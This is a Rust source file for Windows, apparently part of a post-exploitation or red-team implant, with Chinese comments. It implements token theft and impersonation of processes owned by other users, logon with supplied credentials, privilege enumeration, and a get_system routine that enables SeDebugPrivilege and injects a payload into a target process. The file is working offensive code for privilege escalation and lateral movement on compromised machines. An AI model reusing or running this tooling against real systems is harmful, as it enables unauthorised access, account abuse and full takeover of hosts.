use std::ffi::c_void;
use std::ptr::null_mut;
use windows::core::{Error, Result, HRESULT, PWSTR};
use windows::Win32::Foundation::{CloseHandle, HANDLE, LUID};
use windows::Win32::Security::{AdjustTokenPrivileges, DuplicateTokenEx, GetTokenInformation, ImpersonateLoggedOnUser, 
                               LogonUserW, LookupAccountSidW, LookupPrivilegeNameW, LookupPrivilegeValueW, RevertToSelf, 
                               SecurityImpersonation, TokenElevation, TokenIntegrityLevel, TokenPrivileges, TokenUser, LOGON32_LOGON_INTERACTIVE, 
                               LOGON32_PROVIDER_DEFAULT, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, SID_NAME_USE, TOKEN_ACCESS_MASK, 
                               TOKEN_ADJUST_PRIVILEGES, TOKEN_ALL_ACCESS, TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE, TOKEN_ELEVATION, 
                               TOKEN_PRIVILEGES, TOKEN_QUERY, TOKEN_TYPE};
use windows::Win32::System::SystemServices::{SECURITY_MANDATORY_HIGH_RID, SECURITY_MANDATORY_LOW_RID, SECURITY_MANDATORY_MEDIUM_RID};
use windows::Win32::System::Threading::{CreateProcessAsUserW, CreateProcessWithLogonW, GetCurrentProcessId, OpenProcess, 
                                        OpenProcessToken, CREATE_PROCESS_LOGON_FLAGS, 
                                        PROCESS_CREATE_THREAD, PROCESS_CREATION_FLAGS, PROCESS_DUP_HANDLE, PROCESS_INFORMATION, 
                                        PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, 
                                        STARTUPINFOW, STARTUPINFOW_FLAGS};
use crate::win::common::{get_buffer, to_wide_string};

use super::inject::remote_inject;

pub fn get_token(pid: u32, access_rights: TOKEN_ACCESS_MASK) -> Result<HANDLE> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid)?;
        let mut token_handle: HANDLE = HANDLE::default();
        OpenProcessToken(process_handle, access_rights, &mut token_handle)?;
        let _ = CloseHandle(process_handle);
        Ok(token_handle)
    }
}

pub fn is_privilege() -> Result<bool> {
    let h_token = get_token(unsafe { GetCurrentProcessId() }, TOKEN_QUERY)?;

    unsafe {
        let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
        let mut size: u32 = 0;

        if GetTokenInformation(
            h_token,
            TokenElevation,
            Some(&mut elevation as *mut _ as *mut c_void),
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        )
            .is_ok()
        {
            return Ok(elevation.TokenIsElevated != 0);
        }

        Err(Error::from_win32())
    }
}

pub fn enable_privilege(privilege_name: &str) -> Result<()> {
    let token_handle = get_token(unsafe { GetCurrentProcessId() }, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY)?;

    unsafe {
        let privilege_name: Vec<u16> = to_wide_string(privilege_name);
        let mut luid: LUID = LUID::default();

        LookupPrivilegeValueW(None, PWSTR(privilege_name.as_ptr() as *mut u16), &mut luid)?;

        let mut tp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        AdjustTokenPrivileges(
            token_handle,
            false,
            Some(&mut tp),
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            None,
            None,
        )?;

        let _ = CloseHandle(token_handle);
    }
    Ok(())
}

pub fn make_token(user_name: &str, domain: &str, password: &str) -> Result<HANDLE> {
    unsafe {
        let user_name: Vec<u16> = to_wide_string(user_name);
        let domain: Vec<u16> = to_wide_string(domain);
        let password: Vec<u16> = to_wide_string(password);

        let mut token_handle: HANDLE = HANDLE::default();

        LogonUserW(
            PWSTR(user_name.as_ptr() as *mut u16),
            PWSTR(domain.as_ptr() as *mut u16),
            PWSTR(password.as_ptr() as *mut u16),
            LOGON32_LOGON_INTERACTIVE,
            LOGON32_PROVIDER_DEFAULT,
            &mut token_handle,
        )?;

        ImpersonateLoggedOnUser(token_handle)?;

        Ok(token_handle)
    }
}

pub fn revert_to_self() -> Result<()> {
    unsafe {
        RevertToSelf()?;
    }
    Ok(())
}

pub fn impersonate_user(username: &str) -> Result<HANDLE> {
    if username.is_empty() {
        return Err(Error::from(HRESULT(1)));
    }

    // 获取进程信息
    let processes = match crate::common::process::get_processes() {
        Ok(procs) => procs,
        Err(_) => {
            return Err(Error::from(
                windows::core::HRESULT(1)
            ));
        }
    };

    // 遍历所有进程，找到用户名匹配的进程
    for (_pid, process) in processes.iter() {
        if process.owner == username {
            impersonate_process(process.pid)?;
        }
    }

    unsafe {
        RevertToSelf()?;
    }

    // 返回错误表示未找到进程
    Err(Error::from(HRESULT(1)))
}

const TOKEN_PRIMARY: TOKEN_TYPE = TOKEN_TYPE(1); // TOKEN_PRIMARY 的实际值为 1

pub fn impersonate_process(pid: u32) -> Result<HANDLE> {
    unsafe {
        let process_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE | PROCESS_TERMINATE,
            false,
            pid,
        )?;

        let mut token_handle: HANDLE = HANDLE::default();
        OpenProcessToken(process_handle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &mut token_handle)?;


        let mut new_token_handle: HANDLE = HANDLE::default();

        DuplicateTokenEx(
            token_handle,
            TOKEN_ALL_ACCESS,
            None,
            SecurityImpersonation,
            TOKEN_PRIMARY,
            &mut new_token_handle,
        )?;

        ImpersonateLoggedOnUser(new_token_handle)?;

        let _ = CloseHandle(token_handle);
        let _ = CloseHandle(process_handle);

        Ok(new_token_handle)
    }
}

pub fn run_process_as_user(username: &str, command: &str, args: &str) -> Result<()> {
    let token_handle = impersonate_user(username)?;

    let mut startup_info: STARTUPINFOW = STARTUPINFOW::default();
    let mut process_info: PROCESS_INFORMATION = PROCESS_INFORMATION::default();

    let command_line = format!("{} {}", command, args);
    let command_line: Vec<u16> = to_wide_string(&command_line);

    unsafe {
        CreateProcessAsUserW(
            token_handle,
            None,
            PWSTR(command_line.as_ptr() as *mut u16),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(0),
            None,
            None,
            &mut startup_info,
            &mut process_info
        )?;

        let _ = CloseHandle(process_info.hProcess);
        let _ = CloseHandle(process_info.hThread);
    }
    Ok(())
}

pub fn get_process_integrity_level(token_handle: HANDLE) -> Result<String> {
    let mut size_needed: u32 = 0;
    unsafe {
        let success = GetTokenInformation(token_handle, TokenIntegrityLevel, None, 0, &mut size_needed);
        get_buffer(success).map_err(|e| {
            let _ = CloseHandle(token_handle);
            e
        })?;

        let mut buffer = vec![0u8; size_needed as usize];

        GetTokenInformation(
            token_handle,
            TokenIntegrityLevel,
            Some(buffer.as_mut_ptr() as *mut c_void),
            size_needed,
            &mut size_needed,
        )?;

        // 提取完整性级别（最后4字节）
        let privilege_level = u32::from_le_bytes([
            buffer[size_needed as usize - 4],
            buffer[size_needed as usize - 3],
            buffer[size_needed as usize - 2],
            buffer[size_needed as usize - 1],
        ]);

        // 判断完整性级别并返回相应的字符串
        Ok(match privilege_level {
            rid if rid < SECURITY_MANDATORY_LOW_RID as u32 => "Untrusted".to_string(),
            rid if rid < SECURITY_MANDATORY_MEDIUM_RID as u32 => "Low".to_string(),
            rid if rid >= SECURITY_MANDATORY_MEDIUM_RID as u32 && rid < SECURITY_MANDATORY_HIGH_RID as u32 => {
                "Medium".to_string()
            }
            rid if rid >= SECURITY_MANDATORY_HIGH_RID as u32 => "High".to_string(),
            _ => "Unknown".to_string(),
        })
    }
}

pub fn lookup_privilege_name_by_luid(luid: LUID) -> Result<(String, String)> {
    unsafe {
        let mut name = vec![0u16; 256];
        let display_name = vec![0u16; 256];
        let mut name_len = name.len() as u32;
        let display_name_len = display_name.len() as u32;
        let mut lang_id: LUID = LUID::default();

        LookupPrivilegeNameW(
            PWSTR(null_mut()),
            &luid,
            PWSTR(name.as_mut_ptr()),
            &mut name_len,
        )?;

        LookupPrivilegeValueW(
            PWSTR(null_mut()),
            PWSTR(name.as_mut_ptr()),
            &mut lang_id,
        )?;

        Ok((
            String::from_utf16_lossy(&name[..name_len as usize]),
            String::from_utf16_lossy(&display_name[..display_name_len as usize]),
        ))
    }
}

pub fn get_privs() -> Result<Vec<(String, String)>> {
    let token_handle = get_token(unsafe { GetCurrentProcessId() }, TOKEN_QUERY)?;

    unsafe {
        let mut token_info_size: u32 = 0;

        // 第一次调用 GetTokenInformation 获取所需的缓冲区大小
        let _ = GetTokenInformation(token_handle, TokenPrivileges, None, 0, &mut token_info_size);

        // 分配缓冲区大小
        let mut buffer = vec![0u8; token_info_size as usize];

        // 第二次调用 GetTokenInformation，获取实际的 TOKEN_PRIVILEGES 信息
        let _ = GetTokenInformation(
            token_handle,
            TokenPrivileges,
            Some(buffer.as_mut_ptr() as *mut c_void),
            token_info_size,
            &mut token_info_size,
        )?;

        // 解析 TOKEN_PRIVILEGES 结构
        let token_privileges = buffer.as_ptr() as *const TOKEN_PRIVILEGES;
        let privilege_count = (*token_privileges).PrivilegeCount as usize;

        // 手动计算 Privileges 数组的位置，并解析每个元素
        let privileges_ptr = &(*token_privileges).Privileges as *const LUID_AND_ATTRIBUTES;
        let privileges_slice = std::slice::from_raw_parts(privileges_ptr, privilege_count);

        let mut priv_list = Vec::new();
        for i in 0..privilege_count {
            let luid = privileges_slice[i].Luid;
            let (name, display_name) = lookup_privilege_name_by_luid(luid)?;
            priv_list.push((name, display_name));
        }

        // 关闭句柄并返回特权列表
        let _ = CloseHandle(token_handle);
        Ok(priv_list)
    }
}


pub fn current_token_owner() -> Result<String> {
    let token_handle = get_token(unsafe { GetCurrentProcessId() }, TOKEN_QUERY)?;

    unsafe {
        // 第一次调用 GetTokenInformation 获取所需的缓冲区大小
        let mut size_needed: u32 = 0;
        let _ = GetTokenInformation(token_handle, TokenUser, None, 0, &mut size_needed);

        // 分配缓冲区以存储 TOKEN_USER 信息
        let mut buffer = vec![0u8; size_needed as usize];

        // 第二次调用 GetTokenInformation 获取实际的 TOKEN_USER 信息
        let _ = GetTokenInformation(
            token_handle,
            TokenUser,
            Some(buffer.as_mut_ptr() as *mut c_void),
            size_needed,
            &mut size_needed,
        )?;

        // 解析返回的 TOKEN_USER 结构体
        let token_user = buffer.as_ptr() as *const windows::Win32::Security::SID_AND_ATTRIBUTES;

        // 准备缓冲区以存储用户名和域名
        let mut user_name = vec![0u16; 256];
        let mut domain_name = vec![0u16; 256];
        let mut user_name_len = 256u32;
        let mut domain_name_len = 256u32;
        let mut sid_name_use = SID_NAME_USE::default();

        // 调用 LookupAccountSidW 查找帐户名
        LookupAccountSidW(
            PWSTR(null_mut()),
            (*token_user).Sid,
            PWSTR(user_name.as_mut_ptr()),
            &mut user_name_len,
            PWSTR(domain_name.as_mut_ptr()),
            &mut domain_name_len,
            &mut sid_name_use,
        )?;

        // 格式化用户名和域名
        let full_name = format!(
            "{}\\{}",
            String::from_utf16_lossy(&domain_name[..domain_name_len as usize]),
            String::from_utf16_lossy(&user_name[..user_name_len as usize])
        );

        // 关闭句柄并返回全名
        let _ = CloseHandle(token_handle);
        Ok(full_name)
    }
}

pub fn run_as(
    username: &str,
    domain: &str,
    password: &str,
    program: &str,
    args: &str,
    show: i32,
    netonly: bool,
) -> Result<()> {
    let u = to_wide_string(username);
    let d = to_wide_string(domain);
    let p = to_wide_string(password);
    let prog = to_wide_string(program);

    let cmd_line = if args.is_empty() {
        to_wide_string(program)
    } else {
        to_wide_string(&format!("{} {}", program, args))
    };

    // 初始化 StartupInfo
    let mut si = STARTUPINFOW {
        cb: std::mem::size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTUPINFOW_FLAGS(1), // STARTF_USESHOWWINDOW
        wShowWindow: show as u16,
        ..Default::default()
    };

    let mut pi = PROCESS_INFORMATION::default();

    // 设置 logon_flags
    let logon_flags = if netonly { CREATE_PROCESS_LOGON_FLAGS(2) } else { CREATE_PROCESS_LOGON_FLAGS(0) };

    unsafe {
        // 调用 CreateProcessWithLogonW 函数
        let result = CreateProcessWithLogonW(
            PWSTR(u.as_ptr() as *mut u16),   // 用户名
            PWSTR(d.as_ptr() as *mut u16),   // 域
            PWSTR(p.as_ptr() as *mut u16),   // 密码
            logon_flags,                     // LOGON_NETCREDENTIALS_ONLY 标志
            PWSTR(prog.as_ptr() as *mut u16), // 程序名
            PWSTR(cmd_line.as_ptr() as *mut u16), // 命令行参数
            PROCESS_CREATION_FLAGS(0),       // 默认创建标志
            None,                            // 使用父进程的环境
            None,                            // 使用父进程的当前目录
            &mut si,                         // 启动信息
            &mut pi                          // 进程信息
        );

        if result.is_ok() {
            // 成功启动进程，关闭进程句柄
            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
            Ok(())
        } else {
            // 返回错误
            Err(result.err().unwrap())
        }
    }
}

pub fn get_system(data: &[u8], pid: u32) -> Result<()> {
    let processes = crate::common::process::get_processes().map_err(|_| {
        Error::from_win32()
    })?;
    
    for (_pid, process) in processes.iter() {
        if process.pid == pid {
            enable_privilege("SeDebugPrivilege")?;
            let _ = remote_inject(data, process.pid);
            break;
        }
    }
    

    Ok(())
}